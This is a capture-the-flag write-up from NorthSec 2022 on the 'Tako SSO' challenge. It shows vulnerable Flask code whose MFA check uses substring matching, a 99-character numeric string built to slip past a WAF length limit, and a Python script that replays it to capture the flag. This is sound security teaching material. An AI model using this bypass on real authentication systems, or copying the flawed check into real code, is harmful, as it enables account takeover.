---
layout: post
title: NorthSec 2022 Writeup - Tako SSO
date: 2022-05-23
type: post
tags:
- Writeup
- Hacking
- NorthSec
- CTF
permalink: /2022/05/NorthSec/TakoSSO
img: 2022/05/NorthSec/TakoSSO/TakoDescription.png
---

```
Besides being an excellent sysadmin, I hold many certifications;
Zumba Instructor, Skydiving expert, barista of excellence,
life coach and resident BOFH.

With this vast experience, I selected our authentication
third party. The fact they are important investors in our
first round of funding has nothing to do with it. Tako
SSO was chosen because of the pricing model and the
ease of integration with our platform. It is so easy even
my grandma could use it, and she has been dead for 10 years.

You can use my login `rosie@tako-sso.ctf/P0rc1n1’

tako-sso.ctf 3
```

In this challenge, we had a small page where we had to enter a number for Multi-Factor Authentication (MFA). 

![Tako Site](/assets/images/2022/05/NorthSec/TakoSSO/TakoSite.png "Take Site")

I try sending 1. 

```http
POST /guess HTTP/1.1
Host: tako-sso.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=UTF-8
Content-Length: 13
Origin: http://tako-sso.ctf
Connection: close
Referer: http://tako-sso.ctf/
Cookie: session=ea85a22c-51cb-462d-9aba-1592777e6149

{"value":"1"}
```
It gave me the expected number and the fact that it reset to 0 tries. It looked like I needed to guess the correct number multiple times without ever getting it wrong. 

```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 63
Set-Cookie: session=ea85a22c-51cb-462d-9aba-1592777e6149; Expires=Wed, 22-Jun-2022 18:02:05 GMT; HttpOnly; Path=/
Server: Werkzeug/0.16.1 Python/3.8.10
Date: Sun, 22 May 2022 18:02:05 GMT

I expected the challenge 50 Resetting you to 0 tries. Good luck
```

The source code was provided with the challenge. It was a simple Python script. 

```python
@app.route("/guess", methods=['POST'])
def guess():
    session['tries'] = int(session.get('tries',0))
    x = secrets.randbelow(100)
    data = request.get_json(force=True)
    value= data['value']
    if str(x) in value:
        session['tries'] = session['tries'] + 1
        if session['tries'] > 1000:
            msg = "The flag is CHANGEME"
        else:
            msg = "This is the value expected. You are at " + str(session['tries']) + " out of 1000. Sending a new challenge"
    else:
        msg = "I expected the challenge value " + str(x) + " Resetting you to 0 tries. Good luck"
        session['tries'] = 0
    return msg

```

The code validated the number by using `in`. 

```python
if str(x) in value:
```

This meant that I could just pass a string with all the numbers from 1 to 100 and the test would pass. I built a small script to output that string and tried to send it. 

```html
<body>
    <h1> <font color='red'> ALERT: WAF BLOCKED THIS REQUEST </h1> <br />
    <small> This website is protected by FreedomFirewall, an Onionotar company </small>
</body>
```

There was a Web Application Firewall preventing me from sending that string. I built a dictionary where the keys were the numbers, but that also got blocked by the firewall.

I experimented with the firewall. It blocked any strings that were longer than 99 characters. I tried to shorten my string as much as I could. I manually removed all duplicates. For example, the numbers from 1 to 9 were all present as part of other numbers, so I removed the. Also when you have 11, 12, 13, and 14 side by side (11121314), you also get 21 and 31. So I could remove them from farther in the string.

I did not know about the [de Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) when I built that string. I would probably have simplified the creation of the string.

By manually building the string, I came up with '1011213141516171819202232425262728293033435363738394044546474849505565758596066768697077879889909180'. This was 100 characters long. I still needed to remove one character, but I could not see how. It took my teammate Danny to tell me that I could add a 9 at the beginning and remove 91 to get a string that worked. 

From there, I just needed a script to send the request until I got the flag.

```python
import requests

for i in range(1001):
    url = 'http://tako-sso.ctf/guess'
    json = {'value':'910112131415161718192022324252627282930334353637383940445464748495055657585960667686970778798899080'}

    x = requests.post(url, json=json, cookies={"session": "ea85a22c-51cb-462d-9aba-1592777e6148"})
    print(x.text)

    if "I expected the challenge" in x.text:
        exit()
```

```bash
$ python tako.py 
...
This is the value expected. You are at 996 out of 1000. Sending a new challenge
This is the value expected. You are at 997 out of 1000. Sending a new challenge
This is the value expected. You are at 998 out of 1000. Sending a new challenge
This is the value expected. You are at 999 out of 1000. Sending a new challenge
This is the value expected. You are at 1000 out of 1000. Sending a new challenge
The flag is Flag-CaptchaShr00m
```
